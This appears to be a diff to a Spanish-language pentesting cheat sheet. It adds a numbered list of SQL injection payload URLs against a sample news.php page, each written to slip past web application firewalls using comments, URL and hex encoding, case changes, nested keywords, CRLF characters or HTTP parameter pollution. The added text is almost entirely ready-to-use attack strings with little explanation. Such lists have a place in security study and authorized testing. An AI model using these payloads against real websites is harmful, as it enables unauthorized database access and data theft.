@@ -2404,11 +2404,59 @@ Para elaborar una inyección **Null Byte**:
 http://example.com/news.php?id=1+%00’union+select+1,2,3′–
 ```
 
-Consultas a través de **SQL Comments**:
+**2. Consultas a través de SQL Comments**
 
 ```bash
 http://example.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3–
 ```
+
+**3. URL Encoding**
+
+```bash
+http://example.com/news.php?id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4—
+```
+
+**4. Encode to Hex Forbidden**
+
+```bash
+http://example.com/news.php?id=-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 –+-
+
+http://example.com/news.php?id=-1%2F%2Funion%2F%2Fselect%2F**%2F1,2,3,4,5 –+-
+```
+
+**5. Case Changing**
+
+```bash
+http://example.com/news.php?id=-1+UnIoN//SeLecT//1,2,3–+-
+```
+
+**6. Replaced Keywords**
+
+```bash
+http://example.com/news.php?id=-1+UNunionION+SEselectLECT+1,2,3–+
+```
+
+**7. WAF Bypassing - using characters**
+
+```bash
+http://example.com/news.php?id=-1+uni*on+sel*ect+1,2,3,4–+-
+```
+
+**8. CRLF WAF Bypass Technique**
+
+```bash
+http://example.com/news.php?id=-1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5 —
+```
+
+**9. HTTP Parameter Pollution (PHP)
+
+```bash
+http://example.com/news.php?id=1;select+1&id=2,3+from+users+where+id=1–
+
+
+http://example.com/news.php?id=-1/* &id= */union/* &id= */select/* &id= */1,2 —
+```
+
 
 ### Pentesting Linux
 
